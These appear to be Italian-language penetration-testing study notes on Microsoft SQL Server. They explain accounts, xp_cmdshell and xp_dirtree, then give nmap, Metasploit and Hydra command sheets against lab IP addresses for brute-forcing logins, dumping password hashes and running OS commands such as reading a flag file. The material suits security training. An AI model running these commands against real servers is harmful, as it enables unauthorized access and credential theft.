Microsoft SQL ( MSSQL) è il sistema di gestione di database relazionali basato su SQL di Microsoft. A differenza di MySQL, di cui abbiamo parlato nell'ultima sezione, MSSQL è closed source ed è stato inizialmente scritto per essere eseguito sui sistemi operativi Windows. È popolare tra gli amministratori di database e gli sviluppatori quando creano applicazioni eseguite su .NET framework di Microsoft grazie al suo forte supporto nativo per .NET. Esistono versioni di MSSQL che verranno eseguite su Linux e MacOS, ma è più probabile che incontreremo istanze MSSQL su target che eseguono Windows.

E' possibile creare funzioni da poter eseguire.
Supporta stored procedure come xp-cmdshell, che consentono di eseguire comandi del sistema operativo Widnows direttamente dal database.
Il processo generato da xp_cmdshell ha gli stessi diritti di sicurezza dell'account di servizio SQL server.
Quando chiamato da un utente che non è membro del ruolo predefinito del server sysadmin, xp_cmdshell si connette a Windows usando un account proxy specificato nelle credenziali denominate `##xp_cmdshell_proxy_account`


Account di Servizio vs Account Membro:
Account di Servizio:
Ogni servizio in SQL Server rappresenta un processo o un set di processi che gestiscono l’autenticazione delle operazioni di SQL Server con Windows.
Gli account di servizio sono utilizzati per eseguire questi processi.
Esempi di servizi:
Servizi di database di SQL Server: Motore di database relazionale di SQL Server.
SID del servizio, se supportato.
Un account del servizio gestito è un tipo di account di dominio creato e gestito dal controller di dominio. Viene assegnato al computer di un singolo membro per l’esecuzione di un servizio e la password viene gestita automaticamente dal controller di dominio1.


Account Membro:
L’account di avvio del servizio SQL Server Agent definisce l’account di Windows con cui viene eseguito SQL Server Agent e le relative autorizzazioni di rete.
Per la corretta esecuzione delle funzioni, è necessario che SQL Server Agent sia configurato per usare le credenziali di un account membro del ruolo predefinito del server sysadmin in SQL Server.
L’account deve disporre delle autorizzazioni di Windows seguenti:
Accedere come servizio (SeServiceLogonRight)2.
È possibile impostare l’account del servizio SQL Server Agent con Gestione configurazione SQL Server in SQL Server usando SQL Server Management Studio23.

L’account sa in Microsoft SQL Server è un account speciale noto come “System Administrator”. Di solito, è l’account di amministratore di sistema predefinito e ha privilegi elevati all’interno del database. Tuttavia, a volte può essere disabilitato per motivi di sicurezza.

L’account sa in Microsoft SQL Server è un account di accesso del motore di database ed è membro del ruolo predefinito del server sysadmin. In altre parole:

sa è un utente (user), mentre sysadmin è un ruolo/privilegio.
sysadmin ha tutti i privilegi, mentre sa è un utente predefinito con privilegi simili a quelli di sysadmin.
L’account sa è sempre presente come account di accesso del motore di database ed è abilitato per impostazione predefinita. Tuttavia, se hai installato SQL Server utilizzando solo l’autenticazione di Windows (senza abilitare l’autenticazione di SQL Server), l’account sa è presente ma disabilitato. Questo significa che puoi abilitarlo e impostare una password per esso, se necessario.

Ricorda che l’account sa ha accesso completo al server, quindi utilizzalo con cautela e assicurati di proteggere adeguatamente la sua password.


MSSQL - NTLM:
L'invio di una richiesta di autenticazione MS-TDS NTLM con un dominio non valido e credenziali nulle farà sì che il servizio remoto risponda con un messaggio NTLMSSP che divulga informazioni per includere NetBIOS, DNS e la versione di build del sistema operativo.



Il NetBIOS computer name è un concetto legato alla comunicazione in reti locali. Ecco alcune informazioni utili:
1. Nome del computer (Computer Name): Questo è il nome del tuo computer, che puoi personalizzare. Ad esempio, se hai un computer chiamato "MYCOMPUTER", questo sarà il suo nome¹. Questo nome viene utilizzato per identificare il tuo dispositivo all'interno della rete locale.

2. Nome NetBIOS: Il nome NetBIOS è spesso simile al nome del computer, ma con alcune restrizioni più rigide. Ad esempio, se il nome del tuo computer è "john", il nome NetBIOS potrebbe essere lo stesso, ma con alcune limitazioni specifiche. Il NetBIOS è un vecchio metodo per risolvere i nomi all'interno di una rete, ma è ancora presente nei sistemi operativi per garantire la compatibilità con le versioni precedenti.

3. Hostname: Il nome host è il nome del tuo computer all'interno della rete. Se il tuo computer è parte di un dominio, il nome host potrebbe includere anche il nome del dominio. Ad esempio, su un dominio, il nome completo del computer potrebbe essere "john.company.local", dove "company.local" è il nome del dominio¹.

In sintesi, il nome del computer, il nome NetBIOS e l'hostname sono spesso simili, ma possono variare a seconda del contesto e dell'ambiente di rete in cui ti trovi.

Per ottenere un elenco dei file all'interno di una cartella in Microsoft SQL Server, puoi utilizzare la stored procedure xp_dirtree. Questa procedura richiede tre parametri:

1. Directory: Questo è il percorso della cartella di cui desideri ottenere l'elenco dei file. Ad esempio, puoi passare 'C:\\' per la directory principale del disco C.
2. Depth: Specifica il numero di livelli di sottocartelle da visualizzare. Il valore predefinito di 0 mostrerà tutte le sottocartelle.
3. File: Questo parametro determina se visualizzare solo le cartelle o sia le cartelle che i file.

Esempio di utilizzo di xp_dirtree per ottenere un elenco di file nella directory principale del disco C:
Questo restituirà un elenco dei file e delle cartelle presenti nella directory specificata. Ricorda che xp_dirtree richiede il ruolo di amministratore di sistema per essere eseguito³. Se hai i privilegi necessari, puoi utilizzare questo approccio per ottenere l'elenco dei file desiderato.




La stored procedure xp_cmdshell in Microsoft SQL Server avvia una shell dei comandi di Windows e passa una stringa per l'esecuzione. L'output viene restituito come righe di testo. Ecco alcuni punti importanti riguardo a xp_cmdshell:

- Sintassi:
    sql
    xp_cmdshell { 'command_string' } [, NO_OUTPUT]
    
    - 'command_string': Una stringa contenente un comando da passare al sistema operativo. La command_string può essere di tipo varchar(8000) o nvarchar(4000) e non può contenere più di un set di virgolette doppie. Se sono presenti spazi nei percorsi di file o nei nomi dei programmi a cui si fa riferimento nella command_string, è necessaria una singola coppia di virgolette. In alternativa, considera l'utilizzo di nomi di file in formato FAT 8.3 se incontri problemi con spazi incorporati nelle stringhe.
    - NO_OUTPUT: Parametro facoltativo che specifica che non deve essere restituito alcun output al client.
- Valori del codice restituito:
    - 0 (esito positivo) o 1 (errore).
- Esempio:   
    Questo restituirà un elenco dei file con estensione .exe contenuti nella directory corrente. Le righe vengono restituite in una colonna nvarchar(255). Se viene usata l'opzione NO_OUTPUT, verrà restituito solo l'output seguente: "The command (s) completed successfully" .

Osservazioni:
- Il processo di Windows generato da xp_cmdshell ha gli stessi diritti di sicurezza dell'account del servizio SQL Server.
- Attenzione: xp_cmdshell è una funzionalità potente e disabilitata per impostazione predefinita. Può essere abilitata e disabilitata tramite la gestione basata su criteri o eseguendo sp_configure.
- L'uso di xp_cmdshell può attivare gli strumenti di controllo della sicurezza.
- xp_cmdshell opera in modo sincrono: il controllo non viene restituito al chiamante fino al completamento del comando della shell dei comandi.
- Quando viene chiamato da un utente che non è membro del ruolo predefinito del server sysadmin, xp_cmdshell si connette a Windows usando il nome dell'account e la password archiviati nelle credenziali denominate ##xp_cmdshell_proxy_account##. Le credenziali dell'account proxy possono essere create eseguendo sp_xp_cmdshell_proxy_account .



```
MSSQL DB Default:
# master: 
Tiene traccia di tutte le informazioni di sistema per un'istanza del server SQL.  
  
# model: 
Database modello che funge da struttura per ogni nuovo database creato. Qualsiasi impostazione modificata nel database modello si rifletterà in qualsiasi nuovo database creato dopo le modifiche al database modello.
  
# msdb:
SQL Server Agent utilizza questo database per pianificare processi e avvisi. 
  
# tempdb:
Memorizza oggetti temporanei.
  
# Resource:
Database di sola lettura contenente oggetti di sistema inclusi con SQL Server
```


##### Nmap script mssql
```
## Nmap script mssql
Nmap - Server Info:
> nmap --script ms-sql-info -p1433 10.4.21.27

MSSQL - NTLM:
L'invio di una richiesta di autenticazione MS-TDS NTLM con un dominio non valido e credenziali nulle farà sì che il servizio remoto risponda con un messaggio NTLMSSP che divulga informazioni per includere NetBIOS, DNS e la versione di build del sistema operativo.



Nmap - Ntlm Info:
> nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27

Nmap - Bruteforce enumerate users and passwords:
> nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27

L’account sa in Microsoft SQL Server è un account speciale noto come “System Administrator”. Di solito, è l’account di amministratore di sistema predefinito e ha privilegi elevati all’interno del database. Tuttavia, a volte può essere disabilitato per motivi di sicurezza.

Nmap - Check empty password with "sa users":
> nmap --script ms-sql-empty-password -p1433 10.4.21.27

Nmap - Extracting Sysusers from MSSQL and storing the ouput in a file
> nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.30.33 -oN output.txt gvim output.txt

Nmap - Dump MSSQL users hashes:
> nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27

Nmap - CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27

Nmap - CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27
```


### Metasploit
```
By default in Metasploit sa user is set to USERNAME and PASSWORD is empty ‘’.

Metasploit - Enum:
nmap --script ms-sql-info -p1433 10.4.23.176
msfconsole
use auxiliary/scanner/mssql/mssql_login
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
exploit

Metasploit - Enum:
> use auxiliary/admin/mssql/mssql_enum
set RHOSTS 10.4.23.176
exploit

Metasploit - Logins: 
> use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS 10.4.23.176
exploit

Metasploit - CMD command:
> use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.4.23.176
set CMD whoami
exploit

Metasploit - Enum Domain Accounts:
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS 10.4.23.176
exploit
```


##### Hydra
```
> hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mssql
```
